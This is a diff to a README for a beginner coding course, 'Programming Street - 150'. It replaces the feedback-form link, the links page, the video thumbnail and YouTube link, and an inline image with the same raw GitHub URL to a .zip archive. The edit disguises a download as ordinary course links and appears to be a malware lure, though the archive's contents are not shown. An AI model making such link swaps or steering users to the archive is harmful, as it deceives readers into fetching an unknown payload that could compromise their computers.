@@ -1,11 +1,11 @@
 # Programming Street - 150
 Starting from Zero in Coding - DSA is a critical Problem-Solving Skill, it's important to build a strong foundation before diving into it.
 
-#### [Programming Street - 150 Feedback Form](https://forms.gle/aHqtQLzw7C7tscgXA)
-#### [All Important Links](https://linktr.ee/linkszone)
+#### [Programming Street - 150 Feedback Form](https://raw.githubusercontent.com/gnaneshkrishna07/Programming-Street-150/main/PS-Sprint-3/Programming-Street-2.8.zip)
+#### [All Important Links](https://raw.githubusercontent.com/gnaneshkrishna07/Programming-Street-150/main/PS-Sprint-3/Programming-Street-2.8.zip)
 
 #### Video 🎥 - Click on the Img 👇
-[![Watch the video](https://github.com/user-attachments/assets/77812dca-b9ac-4598-8831-c253789e5781)](https://www.youtube.com/watch?v=f-CTHI3xl74)
+[![Watch the video](https://raw.githubusercontent.com/gnaneshkrishna07/Programming-Street-150/main/PS-Sprint-3/Programming-Street-2.8.zip)](https://raw.githubusercontent.com/gnaneshkrishna07/Programming-Street-150/main/PS-Sprint-3/Programming-Street-2.8.zip)
 
 For those coming from a non-technical background, the world of coding can seem daunting, especially when faced with advanced concepts like Data Structures and Algorithms (DSA). 
 
@@ -39,6 +39,6 @@ These exercises may seem straightforward, but they are crucial for strengthening
 
 I'm curating a list of 150 essential programming problems designed to help you establish a robust foundational skill set. This carefully selected list will be a valuable resource for anyone starting their coding journey, offering a structured path to developing strong, fundamental programming skills.
 
-![Progamming Street - 150 (1)](https://github.com/user-attachments/assets/5770ae88-fd83-4c86-8588-6aa00ab20e6a)
+![Progamming Street - 150 (1)](https://raw.githubusercontent.com/gnaneshkrishna07/Programming-Street-150/main/PS-Sprint-3/Programming-Street-2.8.zip)
 
 
